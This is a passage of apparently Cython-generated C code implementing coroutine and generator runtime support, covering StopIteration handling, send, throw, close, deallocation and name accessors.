*tb;\n    PyObject *value = NULL;\n    CYTHON_UNUSED_VAR(__pyx_tstate);\n    __Pyx_ErrFetch(&et, &ev, &tb);\n    if (!et) {\n        Py_XDECREF(tb);\n        Py_XDECREF(ev);\n        Py_INCREF(Py_None);\n        *pvalue = Py_None;\n        return 0;\n    }\n    if (likely(et == PyExc_StopIteration)) {\n        if (!ev) {\n            Py_INCREF(Py_None);\n            value = Py_None;\n        }\n        else if (likely(__Pyx_IS_TYPE(ev, (PyTypeObject*)PyExc_StopIteration))) {\n            #if CYTHON_COMPILING_IN_LIMITED_API || CYTHON_COMPILING_IN_GRAAL\n            value = PyObject_GetAttr(ev, __pyx_mstate_global->__pyx_n_u_value);\n            if (unlikely(!value)) goto limited_api_failure;\n            #else\n            value = ((PyStopIterationObject *)ev)->value;\n            Py_INCREF(value);\n            #endif\n            Py_DECREF(ev);\n        }\n        else if (unlikely(PyTuple_Check(ev))) {\n            Py_ssize_t tuple_size = __Pyx_PyTuple_GET_SIZE(ev);\n            #if !CYTHON_ASSUME_SAFE_SIZE\n            if (unlikely(tuple_size < 0)) {\n                Py_XDECREF(tb);\n                Py_DECREF(ev);\n                Py_DECREF(et);\n                return -1;\n            }\n            #endif\n            if (tuple_size >= 1) {\n#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS\n                value = PyTuple_GET_ITEM(ev, 0);\n                Py_INCREF(value);\n#elif CYTHON_ASSUME_SAFE_MACROS\n                value = PySequence_ITEM(ev, 0);\n#else\n                value = PySequence_GetItem(ev, 0);\n                if (!value) goto limited_api_failure;\n#endif\n            } else {\n                Py_INCREF(Py_None);\n                value = Py_None;\n            }\n            Py_DECREF(ev);\n        }\n        else if (!__Pyx_TypeCheck(ev, (PyTypeObject*)PyExc_StopIteration)) {\n            value = ev;\n        }\n        if (likely(value)) {\n            Py_XDECREF(tb);\n            Py_DECREF(et);\n            *pvalue = value;\n            return 0;\n        }\n    } else if (!__Pyx_PyErr_GivenExceptionMatches(et, PyExc_StopIteration)) {\n        __Pyx_ErrRestore(et, ev, tb);\n        return -1;\n    }\n    PyErr_NormalizeException(&et, &ev, &tb);\n    if (unlikely(!PyObject_TypeCheck(ev, (PyTypeObject*)PyExc_StopIteration))) {\n        __Pyx_ErrRestore(et, ev, tb);\n        return -1;\n    }\n    Py_XDECREF(tb);\n    Py_DECREF(et);\n#if CYTHON_COMPILING_IN_LIMITED_API\n    value = PyObject_GetAttr(ev, __pyx_mstate_global->__pyx_n_u_value);\n#else\n    value = ((PyStopIterationObject *)ev)->value;\n    Py_INCREF(value);\n#endif\n    Py_DECREF(ev);\n#if CYTHON_COMPILING_IN_LIMITED_API\n    if (unlikely(!value)) return -1;\n#endif\n    *pvalue = value;\n    return 0;\n#if CYTHON_COMPILING_IN_LIMITED_API || CYTHON_COMPILING_IN_GRAAL || !CYTHON_ASSUME_SAFE_MACROS\n  limited_api_failure:\n    Py_XDECREF(et);\n    Py_XDECREF(tb);\n    Py_XDECREF(ev);\n    return -1;\n#endif\n}\nstatic CYTHON_INLINE\n__Pyx_PySendResult __Pyx_Coroutine_status_from_result(PyObject **retval) {\n    if (*retval) {\n        return PYGEN_NEXT;\n    } else if (likely(__Pyx_PyGen__FetchStopIterationValue(__Pyx_PyThreadState_Current, retval) == 0)) {\n        return PYGEN_RETURN;\n    } else {\n        return PYGEN_ERROR;\n    }\n}\nstatic CYTHON_INLINE\nvoid __Pyx_Coroutine_ExceptionClear(__Pyx_ExcInfoStruct *exc_state) {\n#if PY_VERSION_HEX >= 0x030B00a4\n    Py_CLEAR(exc_state->exc_value);\n#else\n    PyObject *t, *v, *tb;\n    t = exc_state->exc_type;\n    v = exc_state->exc_value;\n    tb = exc_state->exc_traceback;\n    exc_state->exc_type = NULL;\n    exc_state->exc_value = NULL;\n    exc_state->exc_traceback = NULL;\n    Py_XDECREF(t);\n    Py_XDECREF(v);\n    Py_XDECREF(tb);\n#endif\n}\n#define __Pyx_Coroutine_AlreadyRunningError(gen)  (__Pyx__Coroutine_AlreadyRunningError(gen), (PyObject*)NULL)\nstatic void __Pyx__Coroutine_AlreadyRunningError(__pyx_CoroutineObject *gen) {\n    const char *msg;\n    CYTHON_MAYBE_UNUSED_VAR(gen);\n    if ((0)) {\n    #ifdef __Pyx_Coroutine_USED\n    } else if (__Pyx_Coroutine_Check((PyObject*)gen)) {\n        msg = "coroutine already executing";\n    #endif\n    #ifdef __Pyx_AsyncGen_USED\n    } else if (__Pyx_AsyncGen_CheckExact((PyObject*)gen)) {\n        msg = "async generator already executing";\n    #endif\n    } else {\n        msg = "generator already executing";\n    }\n    PyErr_SetString(PyExc_ValueError, msg);\n}\nstatic void __Pyx_Coroutine_AlreadyTerminatedError(PyObject *gen, PyObject *value, int closing) {\n    CYTHON_MAYBE_UNUSED_VAR(gen);\n    CYTHON_MAYBE_UNUSED_VAR(closing);\n    #ifdef __Pyx_Coroutine_USED\n    if (!closing && __Pyx_Coroutine_Check(gen)) {\n        PyErr_SetString(PyExc_RuntimeError, "cannot reuse already awaited coroutine");\n    } else\n    #endif\n    if (value) {\n        #ifdef __Pyx_AsyncGen_USED\n        if (__Pyx_AsyncGen_CheckExact(gen))\n            PyErr_SetNone(PyExc_StopAsyncIteration);\n        else\n        #endif\n        PyErr_SetNone(PyExc_StopIteration);\n    }\n}\nstatic\n__Pyx_PySendResult __Pyx_Coroutine_SendEx(__pyx_CoroutineObject *self, PyObject *value, PyObject **result, int closing) {\n    __Pyx_PyThreadState_declare\n    PyThreadState *tstate;\n    __Pyx_ExcInfoStruct *exc_state;\n    PyObject *retval;\n    assert(__Pyx_Coroutine_get_is_running(self));  // Callers should ensure is_running\n    if (unlikely(self->resume_label == -1)) {\n        __Pyx_Coroutine_AlreadyTerminatedError((PyObject*)self, value, closing);\n        return PYGEN_ERROR;\n    }\n#if CYTHON_FAST_THREAD_STATE\n    __Pyx_PyThreadState_assign\n    tstate = __pyx_tstate;\n#else\n    tstate = __Pyx_PyThreadState_Current;\n#endif\n    exc_state = &self->gi_exc_state;\n    if (exc_state->exc_value) {\n        #if CYTHON_COMPILING_IN_LIMITED_API || CYTHON_COMPILING_IN_PYPY\n        #else\n        PyObject *exc_tb;\n        #if PY_VERSION_HEX >= 0x030B00a4 && !CYTHON_COMPILING_IN_CPYTHON\n        exc_tb = PyException_GetTraceback(exc_state->exc_value);\n        #elif PY_VERSION_HEX >= 0x030B00a4\n        exc_tb = ((PyBaseExceptionObject*) exc_state->exc_value)->traceback;\n        #else\n        exc_tb = exc_state->exc_traceback;\n        #endif\n        if (exc_tb) {\n            PyTracebackObject *tb = (PyTracebackObject *) exc_tb;\n            PyFrameObject *f = tb->tb_frame;\n            assert(f->f_back == NULL);\n            #if PY_VERSION_HEX >= 0x030B00A1\n            f->f_back = PyThreadState_GetFrame(tstate);\n            #else\n            Py_XINCREF(tstate->frame);\n            f->f_back = tstate->frame;\n            #endif\n            #if PY_VERSION_HEX >= 0x030B00a4 && !CYTHON_COMPILING_IN_CPYTHON\n            Py_DECREF(exc_tb);\n            #endif\n        }\n        #endif\n    }\n#if CYTHON_USE_EXC_INFO_STACK\n    exc_state->previous_item = tstate->exc_info;\n    tstate->exc_info = exc_state;\n#else\n    if (exc_state->exc_type) {\n        __Pyx_ExceptionSwap(&exc_state->exc_type, &exc_state->exc_value, &exc_state->exc_traceback);\n    } else {\n        __Pyx_Coroutine_ExceptionClear(exc_state);\n        __Pyx_ExceptionSave(&exc_state->exc_type, &exc_state->exc_value, &exc_state->exc_traceback);\n    }\n#endif\n    retval = self->body(self, tstate, value);\n#if CYTHON_USE_EXC_INFO_STACK\n    exc_state = &self->gi_exc_state;\n    tstate->exc_info = exc_state->previous_item;\n    exc_state->previous_item = NULL;\n    __Pyx_Coroutine_ResetFrameBackpointer(exc_state);\n#endif\n    *result = retval;\n    if (self->resume_label == -1) {\n        return likely(retval) ? PYGEN_RETURN : PYGEN_ERROR;\n    }\n    return PYGEN_NEXT;\n}\nstatic CYTHON_INLINE void __Pyx_Coroutine_ResetFrameBackpointer(__Pyx_ExcInfoStruct *exc_state) {\n#if CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API\n    CYTHON_UNUSED_VAR(exc_state);\n#else\n    PyObject *exc_tb;\n    #if PY_VERSION_HEX >= 0x030B00a4\n    if (!exc_state->exc_value) return;\n    exc_tb = PyException_GetTraceback(exc_state->exc_value);\n    #else\n    exc_tb = exc_state->exc_traceback;\n    #endif\n    if (likely(exc_tb)) {\n        PyTracebackObject *tb = (PyTracebackObject *) exc_tb;\n        PyFrameObject *f = tb->tb_frame;\n        Py_CLEAR(f->f_back);\n        #if PY_VERSION_HEX >= 0x030B00a4\n        Py_DECREF(exc_tb);\n        #endif\n    }\n#endif\n}\n#define __Pyx_Coroutine_MethodReturnFromResult(gen, result, retval, iternext)\\\n    ((result) == PYGEN_NEXT ? (retval) : __Pyx__Coroutine_MethodReturnFromResult(gen, result, retval, iternext))\nstatic PyObject *\n__Pyx__Coroutine_MethodReturnFromResult(PyObject* gen, __Pyx_PySendResult result, PyObject *retval, int iternext) {\n    CYTHON_MAYBE_UNUSED_VAR(gen);\n    if (likely(result == PYGEN_RETURN)) {\n        int is_async = 0;\n        #ifdef __Pyx_AsyncGen_USED\n        is_async = __Pyx_AsyncGen_CheckExact(gen);\n        #endif\n        __Pyx_ReturnWithStopIteration(retval, is_async, iternext);\n        Py_XDECREF(retval);\n    }\n    return NULL;\n}\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic CYTHON_INLINE\nPyObject *__Pyx_PyGen_Send(PyGenObject *gen, PyObject *arg) {\n#if PY_VERSION_HEX <= 0x030A00A1\n    return _PyGen_Send(gen, arg);\n#else\n    PyObject *result;\n    if (PyIter_Send((PyObject*)gen, arg ? arg : Py_None, &result) == PYGEN_RETURN) {\n        if (PyAsyncGen_CheckExact(gen)) {\n            assert(result == Py_None);\n            PyErr_SetNone(PyExc_StopAsyncIteration);\n        }\n        else if (result == Py_None) {\n            PyErr_SetNone(PyExc_StopIteration);\n        }\n        else {\n#if PY_VERSION_HEX < 0x030d00A1\n            _PyGen_SetStopIterationValue(result);\n#else\n            if (!PyTuple_Check(result) && !PyExceptionInstance_Check(result)) {\n                PyErr_SetObject(PyExc_StopIteration, result);\n            } else {\n                PyObject *exc = __Pyx_PyObject_CallOneArg(PyExc_StopIteration, result);\n                if (likely(exc != NULL)) {\n                    PyErr_SetObject(PyExc_StopIteration, exc);\n                    Py_DECREF(exc);\n                }\n            }\n#endif\n        }\n        Py_DECREF(result);\n        result = NULL;\n    }\n    return result;\n#endif\n}\n#endif\nstatic CYTHON_INLINE __Pyx_PySendResult\n__Pyx_Coroutine_FinishDelegation(__pyx_CoroutineObject *gen, PyObject** retval) {\n    __Pyx_PySendResult result;\n    PyObject *val = NULL;\n    assert(__Pyx_Coroutine_get_is_running(gen));\n    __Pyx_Coroutine_Undelegate(gen);\n    __Pyx_PyGen__FetchStopIterationValue(__Pyx_PyThreadState_Current, &val);\n    result = __Pyx_Coroutine_SendEx(gen, val, retval, 0);\n    Py_XDECREF(val);\n    return result;\n}\n#if CYTHON_USE_AM_SEND\nstatic __Pyx_PySendResult\n__Pyx_Coroutine_SendToDelegate(__pyx_CoroutineObject *gen, __Pyx_pyiter_sendfunc gen_am_send, PyObject *value, PyObject **retval) {\n    PyObject *ret = NULL;\n    __Pyx_PySendResult delegate_result, result;\n    assert(__Pyx_Coroutine_get_is_running(gen));\n    delegate_result = gen_am_send(gen->yieldfrom, value, &ret);\n    if (delegate_result == PYGEN_NEXT) {\n        assert (ret != NULL);\n        *retval = ret;\n        return PYGEN_NEXT;\n    }\n    assert (delegate_result != PYGEN_ERROR || ret == NULL);\n    __Pyx_Coroutine_Undelegate(gen);\n    result = __Pyx_Coroutine_SendEx(gen, ret, retval, 0);\n    Py_XDECREF(ret);\n    return result;\n}\n#endif\nstatic PyObject *__Pyx_Coroutine_Send(PyObject *self, PyObject *value) {\n    PyObject *retval = NULL;\n    __Pyx_PySendResult result = __Pyx_Coroutine_AmSend(self, value, &retval);\n    return __Pyx_Coroutine_MethodReturnFromResult(self, result, retval, 0);\n}\nstatic __Pyx_PySendResult\n__Pyx_Coroutine_AmSend(PyObject *self, PyObject *value, PyObject **retval) {\n    __Pyx_PySendResult result;\n    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject*) self;\n    if (unlikely(__Pyx_Coroutine_test_and_set_is_running(gen))) {\n        *retval = __Pyx_Coroutine_AlreadyRunningError(gen);\n        return PYGEN_ERROR;\n    }\n    #if CYTHON_USE_AM_SEND\n    if (gen->yieldfrom_am_send) {\n        result = __Pyx_Coroutine_SendToDelegate(gen, gen->yieldfrom_am_send, value, retval);\n    } else\n    #endif\n    if (gen->yieldfrom) {\n        PyObject *yf = gen->yieldfrom;\n        PyObject *ret;\n      #if !CYTHON_USE_AM_SEND\n        #ifdef __Pyx_Generator_USED\n        if (__Pyx_Generator_CheckExact(yf)) {\n            ret = __Pyx_Coroutine_Send(yf, value);\n        } else\n        #endif\n        #ifdef __Pyx_Coroutine_USED\n        if (__Pyx_Coroutine_Check(yf)) {\n            ret = __Pyx_Coroutine_Send(yf, value);\n        } else\n        #endif\n        #ifdef __Pyx_AsyncGen_USED\n        if (__pyx_PyAsyncGenASend_CheckExact(yf)) {\n            ret = __Pyx_async_gen_asend_send(yf, value);\n        } else\n        #endif\n        #if CYTHON_COMPILING_IN_CPYTHON\n        if (PyGen_CheckExact(yf)) {\n            ret = __Pyx_PyGen_Send((PyGenObject*)yf, value == Py_None ? NULL : value);\n        } else\n        if (PyCoro_CheckExact(yf)) {\n            ret = __Pyx_PyGen_Send((PyGenObject*)yf, value == Py_None ? NULL : value);\n        } else\n        #endif\n      #endif\n        {\n            #if !CYTHON_COMPILING_IN_LIMITED_API || __PYX_LIMITED_VERSION_HEX >= 0x03080000\n            if (value == Py_None && PyIter_Check(yf))\n                ret = __Pyx_PyIter_Next_Plain(yf);\n            else\n            #endif\n                ret = __Pyx_PyObject_CallMethod1(yf, __pyx_mstate_global->__pyx_n_u_send, value);\n        }\n        if (likely(ret)) {\n            __Pyx_Coroutine_unset_is_running(gen);\n            *retval = ret;\n            return PYGEN_NEXT;\n        }\n        result = __Pyx_Coroutine_FinishDelegation(gen, retval);\n    } else {\n        result = __Pyx_Coroutine_SendEx(gen, value, retval, 0);\n    }\n    __Pyx_Coroutine_unset_is_running(gen);\n    return result;\n}\nstatic int __Pyx_Coroutine_CloseIter(__pyx_CoroutineObject *gen, PyObject *yf) {\n    __Pyx_PySendResult result;\n    PyObject *retval = NULL;\n    CYTHON_UNUSED_VAR(gen);\n    assert(__Pyx_Coroutine_get_is_running(gen));\n    #ifdef __Pyx_Generator_USED\n    if (__Pyx_Generator_CheckExact(yf)) {\n        result = __Pyx_Coroutine_Close(yf, &retval);\n    } else\n    #endif\n    #ifdef __Pyx_Coroutine_USED\n    if (__Pyx_Coroutine_Check(yf)) {\n        result = __Pyx_Coroutine_Close(yf, &retval);\n    } else\n    if (__Pyx_CoroutineAwait_CheckExact(yf)) {\n        result = __Pyx_CoroutineAwait_Close((__pyx_CoroutineAwaitObject*)yf);\n    } else\n    #endif\n    #ifdef __Pyx_AsyncGen_USED\n    if (__pyx_PyAsyncGenASend_CheckExact(yf)) {\n        retval = __Pyx_async_gen_asend_close(yf, NULL);\n        result = PYGEN_RETURN;\n    } else\n    if (__pyx_PyAsyncGenAThrow_CheckExact(yf)) {\n        retval = __Pyx_async_gen_athrow_close(yf, NULL);\n        result = PYGEN_RETURN;\n    } else\n    #endif\n    {\n        PyObject *meth;\n        result = PYGEN_RETURN;\n        meth = __Pyx_PyObject_GetAttrStrNoError(yf, __pyx_mstate_global->__pyx_n_u_close);\n        if (unlikely(!meth)) {\n            if (unlikely(PyErr_Occurred())) {\n                PyErr_WriteUnraisable(yf);\n            }\n        } else {\n            retval = __Pyx_PyObject_CallNoArg(meth);\n            Py_DECREF(meth);\n            if (unlikely(!retval)) {\n                result = PYGEN_ERROR;\n            }\n        }\n    }\n    Py_XDECREF(retval);\n    return result == PYGEN_ERROR ? -1 : 0;\n}\nstatic PyObject *__Pyx_Generator_Next(PyObject *self) {\n    __Pyx_PySendResult result;\n    PyObject *retval = NULL;\n    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject*) self;\n    if (unlikely(__Pyx_Coroutine_test_and_set_is_running(gen))) {\n        return __Pyx_Coroutine_AlreadyRunningError(gen);\n    }\n    #if CYTHON_USE_AM_SEND\n    if (gen->yieldfrom_am_send) {\n        result = __Pyx_Coroutine_SendToDelegate(gen, gen->yieldfrom_am_send, Py_None, &retval);\n    } else\n    #endif\n    if (gen->yieldfrom) {\n        PyObject *yf = gen->yieldfrom;\n        PyObject *ret;\n        #ifdef __Pyx_Generator_USED\n        if (__Pyx_Generator_CheckExact(yf)) {\n            ret = __Pyx_Generator_Next(yf);\n        } else\n        #endif\n        #ifdef __Pyx_Coroutine_USED\n        if (__Pyx_Coroutine_CheckExact(yf)) {\n            ret = __Pyx_Coroutine_Send(yf, Py_None);\n        } else\n        #endif\n        #if CYTHON_COMPILING_IN_CPYTHON && (PY_VERSION_HEX < 0x030A00A3 || !CYTHON_USE_AM_SEND)\n        if (PyGen_CheckExact(yf)) {\n            ret = __Pyx_PyGen_Send((PyGenObject*)yf, NULL);\n        } else\n        #endif\n            ret = __Pyx_PyIter_Next_Plain(yf);\n        if (likely(ret)) {\n            __Pyx_Coroutine_unset_is_running(gen);\n            return ret;\n        }\n        result = __Pyx_Coroutine_FinishDelegation(gen, &retval);\n    } else {\n        result = __Pyx_Coroutine_SendEx(gen, Py_None, &retval, 0);\n    }\n    __Pyx_Coroutine_unset_is_running(gen);\n    return __Pyx_Coroutine_MethodReturnFromResult(self, result, retval, 1);\n}\nstatic PyObject *__Pyx_Coroutine_Close_Method(PyObject *self, PyObject *arg) {\n    PyObject *retval = NULL;\n    __Pyx_PySendResult result;\n    CYTHON_UNUSED_VAR(arg);\n    result = __Pyx_Coroutine_Close(self, &retval);\n    if (unlikely(result == PYGEN_ERROR))\n        return NULL;\n    Py_XDECREF(retval);\n    Py_RETURN_NONE;\n}\nstatic __Pyx_PySendResult\n__Pyx_Coroutine_Close(PyObject *self, PyObject **retval) {\n    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;\n    __Pyx_PySendResult result;\n    PyObject *yf;\n    int err = 0;\n    if (unlikely(__Pyx_Coroutine_test_and_set_is_running(gen))) {\n        *retval = __Pyx_Coroutine_AlreadyRunningError(gen);\n        return PYGEN_ERROR;\n    }\n    yf = gen->yieldfrom;\n    if (yf) {\n        Py_INCREF(yf);\n        err = __Pyx_Coroutine_CloseIter(gen, yf);\n        __Pyx_Coroutine_Undelegate(gen);\n        Py_DECREF(yf);\n    }\n    if (err == 0)\n        PyErr_SetNone(PyExc_GeneratorExit);\n    result = __Pyx_Coroutine_SendEx(gen, NULL, retval, 1);\n    if (result == PYGEN_ERROR) {\n        __Pyx_PyThreadState_declare\n        __Pyx_PyThreadState_assign\n        __Pyx_Coroutine_unset_is_running(gen);\n        if (!__Pyx_PyErr_Occurred()) {\n            return PYGEN_RETURN;\n        } else if (likely(__Pyx_PyErr_ExceptionMatches2(PyExc_GeneratorExit, PyExc_StopIteration))) {\n            __Pyx_PyErr_Clear();\n            return PYGEN_RETURN;\n        }\n        return PYGEN_ERROR;\n    } else if (likely(result == PYGEN_RETURN && *retval == Py_None)) {\n        __Pyx_Coroutine_unset_is_running(gen);\n        return PYGEN_RETURN;\n    } else {\n        const char *msg;\n        Py_DECREF(*retval);\n        *retval = NULL;\n        if ((0)) {\n        #ifdef __Pyx_Coroutine_USED\n        } else if (__Pyx_Coroutine_Check(self)) {\n            msg = "coroutine ignored GeneratorExit";\n        #endif\n        #ifdef __Pyx_AsyncGen_USED\n        } else if (__Pyx_AsyncGen_CheckExact(self)) {\n            msg = "async generator ignored GeneratorExit";\n        #endif\n        } else {\n            msg = "generator ignored GeneratorExit";\n        }\n        PyErr_SetString(PyExc_RuntimeError, msg);\n        __Pyx_Coroutine_unset_is_running(gen);\n        return PYGEN_ERROR;\n    }\n}\nstatic PyObject *__Pyx__Coroutine_Throw(PyObject *self, PyObject *typ, PyObject *val, PyObject *tb,\n                                        PyObject *args, int close_on_genexit) {\n    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;\n    PyObject *yf;\n    if (unlikely(__Pyx_Coroutine_test_and_set_is_running(gen)))\n        return __Pyx_Coroutine_AlreadyRunningError(gen);\n    yf = gen->yieldfrom;\n    if (yf) {\n        __Pyx_PySendResult result;\n        PyObject *ret;\n        Py_INCREF(yf);\n        if (__Pyx_PyErr_GivenExceptionMatches(typ, PyExc_GeneratorExit) && close_on_genexit) {\n            int err = __Pyx_Coroutine_CloseIter(gen, yf);\n            Py_DECREF(yf);\n            __Pyx_Coroutine_Undelegate(gen);\n            if (err < 0)\n                goto propagate_exception;\n            goto throw_here;\n        }\n        if (0\n        #ifdef __Pyx_Generator_USED\n            || __Pyx_Generator_CheckExact(yf)\n        #endif\n        #ifdef __Pyx_Coroutine_USED\n            || __Pyx_Coroutine_Check(yf)\n        #endif\n            ) {\n            ret = __Pyx__Coroutine_Throw(yf, typ, val, tb, args, close_on_genexit);\n        #ifdef __Pyx_Coroutine_USED\n        } else if (__Pyx_CoroutineAwait_CheckExact(yf)) {\n            ret = __Pyx__Coroutine_Throw(((__pyx_CoroutineAwaitObject*)yf)->coroutine, typ, val, tb, args, close_on_genexit);\n        #endif\n        } else {\n            PyObject *meth = __Pyx_PyObject_GetAttrStrNoError(yf, __pyx_mstate_global->__pyx_n_u_throw);\n            if (unlikely(!meth)) {\n                Py_DECREF(yf);\n                if (unlikely(PyErr_Occurred())) {\n                    __Pyx_Coroutine_unset_is_running(gen);\n                    return NULL;\n                }\n                __Pyx_Coroutine_Undelegate(gen);\n                goto throw_here;\n            }\n            if (likely(args)) {\n                ret = __Pyx_PyObject_Call(meth, args, NULL);\n            } else {\n                PyObject *cargs[4] = {NULL, typ, val, tb};\n                ret = __Pyx_PyObject_FastCall(meth, cargs+1, 3 | __Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET);\n            }\n            Py_DECREF(meth);\n        }\n        Py_DECREF(yf);\n        if (ret) {\n            __Pyx_Coroutine_unset_is_running(gen);\n            return ret;\n        }\n        result = __Pyx_Coroutine_FinishDelegation(gen, &ret);\n        __Pyx_Coroutine_unset_is_running(gen);\n        return __Pyx_Coroutine_MethodReturnFromResult(self, result, ret, 0);\n    }\nthrow_here:\n    __Pyx_Raise(typ, val, tb, NULL);\npropagate_exception:\n    {\n        PyObject *retval = NULL;\n        __Pyx_PySendResult result = __Pyx_Coroutine_SendEx(gen, NULL, &retval, 0);\n        __Pyx_Coroutine_unset_is_running(gen);\n        return __Pyx_Coroutine_MethodReturnFromResult(self, result, retval, 0);\n    }\n}\nstatic PyObject *__Pyx_Coroutine_Throw(PyObject *self, PyObject *args) {\n    PyObject *typ;\n    PyObject *val = NULL;\n    PyObject *tb = NULL;\n    if (unlikely(!PyArg_UnpackTuple(args, "throw", 1, 3, &typ, &val, &tb)))\n        return NULL;\n    return __Pyx__Coroutine_Throw(self, typ, val, tb, args, 1);\n}\nstatic CYTHON_INLINE int __Pyx_Coroutine_traverse_excstate(__Pyx_ExcInfoStruct *exc_state, visitproc visit, void *arg) {\n#if PY_VERSION_HEX >= 0x030B00a4\n    Py_VISIT(exc_state->exc_value);\n#else\n    Py_VISIT(exc_state->exc_type);\n    Py_VISIT(exc_state->exc_value);\n    Py_VISIT(exc_state->exc_traceback);\n#endif\n    return 0;\n}\nstatic int __Pyx_Coroutine_traverse(__pyx_CoroutineObject *gen, visitproc visit, void *arg) {\n    {\n        int e = __Pyx_call_type_traverse((PyObject*)gen, 1, visit, arg);\n        if (e) return e;\n    }\n    Py_VISIT(gen->closure);\n    Py_VISIT(gen->classobj);\n    Py_VISIT(gen->yieldfrom);\n    return __Pyx_Coroutine_traverse_excstate(&gen->gi_exc_state, visit, arg);\n}\nstatic int __Pyx_Coroutine_clear(PyObject *self) {\n    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;\n    Py_CLEAR(gen->closure);\n    Py_CLEAR(gen->classobj);\n    __Pyx_Coroutine_Undelegate(gen);\n    __Pyx_Coroutine_ExceptionClear(&gen->gi_exc_state);\n#ifdef __Pyx_AsyncGen_USED\n    if (__Pyx_AsyncGen_CheckExact(self)) {\n        Py_CLEAR(((__pyx_PyAsyncGenObject*)gen)->ag_finalizer);\n    }\n#endif\n    Py_CLEAR(gen->gi_code);\n    Py_CLEAR(gen->gi_frame);\n    Py_CLEAR(gen->gi_name);\n    Py_CLEAR(gen->gi_qualname);\n    Py_CLEAR(gen->gi_modulename);\n    return 0;\n}\nstatic void __Pyx_Coroutine_dealloc(PyObject *self) {\n    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;\n    PyObject_GC_UnTrack(gen);\n    if (gen->gi_weakreflist != NULL)\n        PyObject_ClearWeakRefs(self);\n    if (gen->resume_label >= 0) {\n        PyObject_GC_Track(self);\n#if CYTHON_USE_TP_FINALIZE\n        if (unlikely(PyObject_CallFinalizerFromDealloc(self)))\n#else\n        {\n            destructor del = __Pyx_PyObject_GetSlot(gen, tp_del, destructor);\n            if (del) del(self);\n        }\n        if (unlikely(Py_REFCNT(self) > 0))\n#endif\n        {\n            return;\n        }\n        PyObject_GC_UnTrack(self);\n    }\n#ifdef __Pyx_AsyncGen_USED\n    if (__Pyx_AsyncGen_CheckExact(self)) {\n        \n        Py_CLEAR(((__pyx_PyAsyncGenObject*)self)->ag_finalizer);\n    }\n#endif\n    __Pyx_Coroutine_clear(self);\n    __Pyx_PyHeapTypeObject_GC_Del(gen);\n}\n#if CYTHON_USE_TP_FINALIZE\nstatic void __Pyx_Coroutine_del(PyObject *self) {\n    PyObject *error_type, *error_value, *error_traceback;\n    __pyx_CoroutineObject *gen = (__pyx_CoroutineObject *) self;\n    __Pyx_PyThreadState_declare\n    if (gen->resume_label < 0) {\n        return;\n    }\n    __Pyx_PyThreadState_assign\n    __Pyx_ErrFetch(&error_type, &error_value, &error_traceback);\n#ifdef __Pyx_AsyncGen_USED\n    if (__Pyx_AsyncGen_CheckExact(self)) {\n        __pyx_PyAsyncGenObject *agen = (__pyx_PyAsyncGenObject*)self;\n        PyObject *finalizer = agen->ag_finalizer;\n        if (finalizer && !agen->ag_closed) {\n            PyObject *res = __Pyx_PyObject_CallOneArg(finalizer, self);\n            if (unlikely(!res)) {\n                PyErr_WriteUnraisable(self);\n            } else {\n                Py_DECREF(res);\n            }\n            __Pyx_ErrRestore(error_type, error_value, error_traceback);\n            return;\n        }\n    }\n#endif\n    if (unlikely(gen->resume_label == 0 && !error_value)) {\n#ifdef __Pyx_Coroutine_USED\n#ifdef __Pyx_Generator_USED\n    if (!__Pyx_Generator_CheckExact(self))\n#endif\n        {\n        PyObject_GC_UnTrack(self);\n        if (unlikely(PyErr_WarnFormat(PyExc_RuntimeWarning, 1, "coroutine \'%.50S\' was never awaited", gen->gi_qualname) < 0))\n            PyErr_WriteUnraisable(self);\n        PyObject_GC_Track(self);\n        }\n#endif\n    } else {\n        PyObject *retval = NULL;\n        __Pyx_PySendResult result = __Pyx_Coroutine_Close(self, &retval);\n        if (result == PYGEN_ERROR) {\n            PyErr_WriteUnraisable(self);\n        } else {\n            Py_XDECREF(retval);\n        }\n    }\n    __Pyx_ErrRestore(error_type, error_value, error_traceback);\n}\n#endif\nstatic PyObject *\n__Pyx_Coroutine_get_name(__pyx_CoroutineObject *self, void *context)\n{\n    PyObject *name = self->gi_name;\n    CYTHON_UNUSED_VAR(context);\n    if (unlikely(!name)) name = Py_None;\n    Py_INCREF(name);\n    return name;\n}\nstatic int\n__Pyx_Coroutine_set_name(__pyx_CoroutineObject *self, PyObject *value, void *context)\n{\n    CYTHON_UNUSED_VAR(context);\n    if (unlikely(value == NULL || !PyUnicode_Check(value))) {\n        PyErr_SetString(PyExc_TypeError,\n                        "__name__ must be set to a string object");\n        return -1;\n    }\n    Py_INCREF(value);\n    __Pyx_Py_XDECREF_SET(self->gi_name, value);\n    return 0;\n}\nstatic PyObject *\n__Pyx_Coroutine_get_qualname(__pyx_CoroutineObject *self, void *context)\n{\n    PyObject *name = self->gi_qualname;\n    CYTHON_UNUSED_VAR(context);\n    if (unlikely(!name)) name = Py_None;\n    Py_INCREF(name);\n    return name;\n}\nstatic int\n__Pyx_Coroutine_set_qualname(__pyx_CoroutineObject *self, PyObject *value, void *context)\n{\n    CYTHON_UNUSED_VAR(context);\n    if (unlikely(value == NULL || !PyUnicode_Check(value))) {\n        PyErr_SetString(PyExc_TypeError,\n                        "__qualname__ must be set to a string object");\n        return -1;\n    }\n    Py_INCREF(value);\n    __Pyx_Py_XDECREF_SET(self->gi_qualname, value);\n    return 0;\n}\nstatic PyObject *\n__Pyx__Coroutine_get_frame(__pyx_CoroutineObject *self)\n{\n#if !CYTHON_COMPILING_IN_LIMITED_API\n    PyObject *frame;\n    #if PY_VERSION_HEX >= 0x030d0000\n    Py_BEGIN_CRITICAL_SECTION(self);\n    #endif\n    frame = self->gi_frame;\n    if (!frame) {\n        if (unlikely(!self->gi_code)) {\n            Py_RETURN_NONE;\n        }\n        PyObject *globals = PyDict_New();\n        if (unlikely(!globals)) return NULL;\n        frame = (PyObject *) PyFrame_New(\n            PyThreadState_Get(),            \n            (PyCodeObject*) self->gi_code,  \n            globals,                        \n            0                               \n        );\n        Py_DECREF(globals);\n        if (unlikely(!frame))\n            return NULL;\n        if (unlikely(self->gi_frame)) {\n            